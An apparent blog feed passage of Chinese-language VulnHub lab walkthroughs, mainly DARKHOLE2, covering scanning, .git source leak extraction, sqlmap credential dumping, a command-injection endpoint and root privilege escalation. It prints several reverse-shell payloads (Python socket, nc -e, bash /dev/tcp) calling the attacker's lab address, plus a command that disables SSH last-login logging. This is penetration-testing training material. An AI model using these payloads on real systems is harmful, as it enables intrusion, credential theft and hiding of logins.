&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1180.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;但是 %2A 出现在这个密码中很突兀，可能是编码原因导致原来的特殊符号在数据传输过程中发生了转码，解码之后得到其是 *&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1181.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用下列两个方式尝试登陆服务器拿到了 eric 的权限&lt;br&gt;
 &lt;code&gt;eric: 3ricThompson%2ACovid19&lt;/code&gt;   &lt;code&gt;eric: 3ricThompson*Covid19&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1182.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到 login.py 看到漏洞形成的原因就是因为其往本地发送了一些登陆的数据包&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1183.png&#34; width=&#34;410&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在 /opt 下还有两个文件是跟 root 账户相关的，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NoZWNoLnhuLS1zaHdoYXRpc215aXAtZGUwdTMyM2dxcXRxMG4ybDVsLnB5&#34;&gt;chech.sh 就是去执行 whatismyip.py&lt;/span&gt;，而 whatismyip.py 就是得到公网 ip&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1184.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 pspy 监控，发现定期执行的 login.py 是用 UID=0 的用即 root 权限执行的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1185.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;eric 用户有对 login.py 的改写权限，改写 login.py 文件，通过 py 反弹 shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;echo &amp;quot;import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.31.84&#39;,4446));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#39;/bin/bash&#39;)&amp;quot; &amp;gt; login.py&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1186.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 最终拿到了 root 用户，&lt;/p&gt;
&lt;h3 id=&#34;vim全屏stty&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#vim全屏stty&#34;&gt;#&lt;/a&gt; vim 全屏 stty&lt;/h3&gt;
&lt;p&gt;但是我么去用 vim 包括使用命令的时候往往输入了一部分内容之后就不能在再同一行继续输入了，这个美观问题经常很头疼。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1187.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;可以重设 stty 的大小，来将反弹得到的 shell 按照自己的 shell 的 stty 来标准化，自己当前的 stty 有多大就将其改为多大&lt;br&gt;
通过 python 先输出一个标准的 shell  &lt;code&gt;python3 -c &amp;quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&amp;quot;&lt;/code&gt; &lt;br&gt;
 输入 ctrl+z 让其后台运行&lt;br&gt;
查看自己当前开启的终端的大小  &lt;code&gt;stty - a&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1188.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;设置 stty 为 raw 模式，并前台启动后台运行的程序 &lt;code&gt;stty raw -echo;fg&lt;/code&gt; &lt;br&gt;
 并输入回车两次&lt;br&gt;
输入 reset 重置 stty，如提示找不到 terminal 的类型，就设置为 xterm&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1189.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;根据查到的终端大小设置反弹 shell 的终端的 stty &lt;code&gt;stty rows 25 columns 79&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1190.png&#34; width=&#34;300&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;现在我们所使用的终端就比较工整了，vim 也能全屏使用了&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1191.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/142%20DARKHOLE2/</guid>
            <title>VULNHUB 42 DARKHOLE2</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/142%20DARKHOLE2/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZGFya2hvbGUtMiw3NDAv&#34;&gt;https://www.vulnhub.com/entry/darkhole-2,740/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2RkLWJsb2cvcC8xNTIzMDgyNi5odG1s&#34;&gt;https://www.cnblogs.com/wdd-blog/p/15230826.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135 (由于设置成了 DHCP、可能多变)&lt;br&gt;
 靶机 DARKHOLE2：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1) 确定靶机 ip 地址和开放的端口&lt;/p&gt;
&lt;p&gt;由已至内网靶机所在主机 MAC 地址自动扫描靶机服务&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1192.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;2) 再次对其开放的端口进行详细的扫描&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p- 192.168.31.12 --min-rate=5000&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1193.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31. 12 、靶机开放端口 22,80&lt;/p&gt;
&lt;p&gt;-&amp;gt; 并且扫描到了再 80 端口上是存在 git 源码泄漏的&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTI=&#34;&gt;http://192.168.31.12&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1194.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;扫描目录  &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.12&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1195.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;依次对得到的目录信息进行访问搜索有价值的信息&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvbG9naW4ucGhw&#34;&gt;http://192.168.31.12/login.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1196.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvZGFzaGJvYXJkLnBocA==&#34;&gt;http://192.168.31.12/dashboard.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1197.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvY29uZmlnLw==&#34;&gt;http://192.168.31.12/config/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1198.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvY29uZmlnL2NvbmZpZy5waHA=&#34;&gt;http://192.168.31.12/config/config.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1199.png&#34; width=&#34;510&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过对上述几个目录的信息收集，只能确定一个后台的登陆地址 login.php，和一个不被允许进入的 dashboard.php 两个信息&lt;/p&gt;
&lt;h3 id=&#34;git源码泄漏利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#git源码泄漏利用&#34;&gt;#&lt;/a&gt; .git 源码泄漏利用&lt;/h3&gt;
&lt;p&gt;在端口扫描阶段因为有.git 的信息，对.git 进行访问&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvLmdpdC8=&#34;&gt; http://192.168.31.12/.git/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1200.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;利用 githack 对源码泄漏进行利用&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1201.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;wget https://github.com/lijiejie/GitHack/archive/refs/heads/master.zip -O Githack.zip -q;unzip -q Githack.zip;cd GitHack-master;&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;python3 GitHack.py http://192.168.31.12/.git&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1202.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过.git 文件可以得到此项目的源码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1203.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;源码中有 config 是敏感文件，进行读取&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1204.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到了数据的账户密码  &lt;code&gt;root:darkhole_2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;但是通过 githack 的方式读取到的源码没有记录之前的 git 版本，没法使用 git 命令去获取到之前提交的版本&lt;/p&gt;
&lt;h3 id=&#34;git-log切换git分支&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#git-log切换git分支&#34;&gt;#&lt;/a&gt; git log 切换 git 分支&lt;/h3&gt;
&lt;p&gt;除了 githack 的利用方式之外还可以用如下方式&lt;/p&gt;
&lt;p&gt;&lt;code&gt;TF=$(mktemp -d); cd $TF;wget -r http://192.168.31.12/.git/ -q; cd $TF/192.168.31.12 &amp;amp;&amp;amp; git clone. webapp &amp;amp;&amp;amp; cd webapp&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1205.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过这种方式可以得到.git 文件，执行 git 的相关命令&lt;/p&gt;
&lt;p&gt;&lt;code&gt;git log&lt;/code&gt;  查看之前提交的版本，看到有一次提交信息是涉及到 login.php 的，切换到该分支查看&lt;br&gt;
 &lt;code&gt;git reset --hard a4d900a8d85e8938d3601f3cef113ee293028e10&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1206.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在 login.php 内容中看到了用户名和密码 &lt;code&gt;lush@admin.com:321&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1207.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;sqlmap一把梭&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap一把梭&#34;&gt;#&lt;/a&gt; sqlmap 一把梭&lt;/h3&gt;
&lt;p&gt;通过得到的用户名和密码进入到了对方后台管理中心&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1208.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;观察 url 地址 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTQvZGFzaGJvYXJkLnBocD9pZD0x&#34;&gt;http://192.168.31.94/dashboard.php?id=1&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;似乎是存在 sql 注入的，通过 burp 截取数据包&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1209.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;sqlmap -r 1.txt --dbs --batch&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1210.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;跑出来了数据库的名字 darkhole_2，继续测试数据库中有哪些表&lt;br&gt;
 &lt;code&gt;sqlmap -r 1.txt --dbs --batch - D darkhole_2 --tables&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1211.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到两张表，选取 ssh 表去查看有哪些列&lt;br&gt;
 &lt;code&gt;sqlmap -r 1.txt --dbs --batch - D darkhole_2 -T ssh --columns&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1212.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到此表下的三个字段 user、id、pass&lt;br&gt;
 &lt;code&gt;sqlmap -r 1.txt --batch -D darkhole_2 -T ssh -C user,id,pass --dump&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1213.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;最终得到了数据库的用户名和密码 &lt;code&gt;jehad:fool&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1214.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;凭借凭据 jehad 拿到了靶机上一个普通用户的权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1215.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看靶机上有没有开放特殊的端口&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1216.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;curl-测试网站&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#curl-测试网站&#34;&gt;#&lt;/a&gt; curl 测试网站&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;发现在这台服务器上有 9999 端口正在运行，但是此端口被防火墙关掉了，我们在 kali 机器上无法访问此端口，可以做 ssh 端口转发将此端口映射到外面，当然也可以通过 curl 命令在这台 linux 机器上直接访问此网站&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;curl -vv 127.0.0.1:9999&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1217.png&#34; width=&#34;350&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;可以看到所提交的数据包以及返回的数据包，并且可以看到页面是采用的 php 写的，返回了一个 cmd 的参数，很有可能是命令执行漏洞；执行系统命令，看当前这个网站是属于哪个用户下的&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;curl 127.0.0.1:9999?cmd=id;echo &#39;&#39;&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;echo &#39;&#39;&lt;/code&gt;  的作用使回显比较美观一些，没有实际的作用&lt;br&gt;
得到了此网站是由用户 losy 的权限搞的，现在需要把 losy 用户的 shell 反弹&lt;br&gt;
判断 losy 是否可以使用 nc 命令反弹 shell&lt;br&gt;
 &lt;code&gt;curl 127.0.0.1:9999?cmd=which%20nc;echo &#39;&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1218.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;使用 nc 反弹 shell，并在 kali 上进行监听&lt;br&gt;
 &lt;code&gt;curl 127.0.0.1:9999?cmd=nc%20192.168.31.99%204444%20-e%20/bin/bash;echo &#39;&#39;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1219.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;反弹失败了，有可能是因为被禁用了 nc、也有可能是未采用 base 64 编码，需要都进行尝试一番，使用 bash 反弹 shell 时的命令执行成功了&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl 127.0.0.1:9999/?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.99%2F4444%200%3E%261%27&lt;/code&gt; &lt;br&gt;
 采用的命令即是： &lt;code&gt;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31. 99 /4444 0&amp;gt;&amp;amp;1&#39;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1220.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;调整为标准终端&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#调整为标准终端&#34;&gt;#&lt;/a&gt; 调整为标准终端&lt;/h3&gt;
&lt;p&gt;调整为一个标准的 tty 终端&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;__import__(&amp;#x27;pty&amp;#x27;).spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty -a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1221.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;调整TERM、&lt;span class=&#34;built_in&#34;&gt;stty&lt;/span&gt;的窗口大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty rows 31 columns 118&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1222.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;此刻的我们已经拿到了 losy 用户的 shell&lt;/p&gt;
&lt;h3 id=&#34;历史遗留信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#历史遗留信息&#34;&gt;#&lt;/a&gt; 历史遗留信息&lt;/h3&gt;
&lt;p&gt;在 kali 上给靶机传输一个 pspy 看看有没有敏感任务被执行&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1223.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到在 /opt/web 下有一个 php 启动本地 9999 端口的命令&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1224.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;由此造成了 9999 端口处的命令执行漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1225.png&#34; width=&#34;290&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;到处查看文件，找到了在 bash_history 里边的敏感记录，当中有一个密码，发现这个密码不是 root 用户的，只是 losy 用户的，这个密码也可以爆破得到&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1226.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 &lt;code&gt;sudo -l&lt;/code&gt;  查到了一条隐私设置错误的记录&lt;br&gt;
 `sudo -u root python3 -c “&lt;strong&gt;import&lt;/strong&gt;(‘os’).system(’/bin/bash’)”``&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1227.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 提权成功拿到了 root 权限&lt;/p&gt;
&lt;h3 id=&#34;ssh-显示系统信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-显示系统信息&#34;&gt;#&lt;/a&gt; ssh 显示系统信息&lt;/h3&gt;
&lt;p&gt;对于 ssh 登陆之后有大量的系统信息展示出来，这在我们看来是完全没有必要的，而且占用了大量的屏幕不太友好，接下来就自定义 ssh 登陆后的信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1228.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这是默认显示的信息，分了两部分，上面的是打印的系统信息，下面的是最后登陆到此服务器的时间和 ip&lt;/p&gt;
&lt;p&gt;上边的信息来自来自 /run/motd.dynamic 文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1229.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这个文件的信息无法修改，哪怕被清空了也会复原。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1230.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;它是由 /etc/update-motd.d/ 下的几个脚本文件来动态生成的。将 /etc/update-motd.d/ 下的脚本移除或者去掉可执行权限可将此动态生成的系统信息去掉。&lt;br&gt;
 &lt;code&gt;chmod -x /etc/update-motd.d/*;echo &amp;gt; /run/motd.dynamic;&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1231.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;反之，赋予这个文件夹所有文件可执行权限之后，可以显示出系统信息开启 linux 系统信息展示： &lt;code&gt;chmod +x /etc/update-motd.d/*&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;ssh-最后登录ip&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-最后登录ip&#34;&gt;#&lt;/a&gt; ssh 最后登录 ip&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;下面的这条显示最后登陆信息是由 ssh 控制，ssh 默认是开启此记录的，可修改 ssh 的配置文件，令其消失不见，关闭最后登陆的日志命令如下：&lt;br&gt;
 &lt;code&gt;sed -i &#39;s/#PrintLastLog yes/PrintLastLog no/g&#39; /etc/ssh/sshd_config;systemctl restart sshd&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1232.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;最后登陆的消息一般来说比较重要，可以方便的看到自己的机器是否有异地登陆的情况出现，开启最后登陆的日志命令如下：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1233.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;ssh-登录时logo&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-登录时logo&#34;&gt;#&lt;/a&gt; ssh 登录时 logo&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;很多时候我们需要自定义一些登陆后的 logo 展示，可以选在登陆前或者登陆后显示一些 logo，而 /etc/motd 的作用就是用来登陆之后会显示的内容，可在 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYm9vdHNjaG9vbC5uZXQvYXNjaWklRTQlQjglOEElRTglQkYlOUIlRTglQTElOEMlRTUlQUQlOTclRTYlQUYlOEQlRTclOUElODQlRTUlOUIlQkUlRTUlQkQlQTIlRTclQkMlOTYlRTclQTAlODE=&#34;&gt;https://www.bootschool.net/ascii 上进行字母的图形编码&lt;/span&gt;&lt;br&gt;
开启 linux 登陆 logo 提示：&lt;br&gt;
 &lt;code&gt;echo -e &#39;\n\n\t\t██╗ ██╗ ████████╗\n\t\t╚██╗██╔╝ ╚══██╔══╝\n\t\t ╚███╔╝ ██║ \n\t\t ██╔██ ╗ ██║ \n\t\t██╔╝ ██╗███████╗██║ \n\t\t ╚═╝ ╚═╝╚══════╝╚═╝\n&#39; &amp;gt; /etc/motd&lt;/code&gt; &lt;br&gt;
-e 表示开启转义 \n 表示换行 \t 表示 tab 按键&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1234.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;关闭这个 logo 提示，只需要将 /etc/motd 清空就可以&lt;br&gt;
 &lt;code&gt;echo &amp;gt; /etc/motd;vim /etc/motd +&amp;quot;d 1 &amp;quot; +wq&lt;/code&gt;  会有一个空格&lt;br&gt;
 &lt;code&gt;cat /dev/null &amp;gt; /etc/motd&lt;/code&gt;  没有任何东西，直接清空文件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1235.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;上述命令是用来展示或者不展示在 linux 登陆之后的 logo，还有一种方式是用来添加在 linux 登陆之前就来展示的 logo，使用 /etc/issue.net 来控制&lt;br&gt;
 &lt;code&gt;sed -i &#39;s/#Banner none/Banner \/etc\/issue.net/g&#39; /etc/ssh/sshd_config;systemctl restart sshd; echo -e &#39;\n\t\t███████╗██╗ ██╗██╗ ██╗\n\t\t╚══███╔╝╚██╗ ██╔╝██║ ██║\n\t\t ███╔╝ ╚████╔╝ ███████║\n\t\t ███╔╝ ╚██╔╝ ██╔══██║\n\t\t███████╗ ██║ ██║ ██║\n\t\t╚══════╝ ╚═╝ ╚═╝ ╚═╝&#39; &amp;gt; /etc/issue.net&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
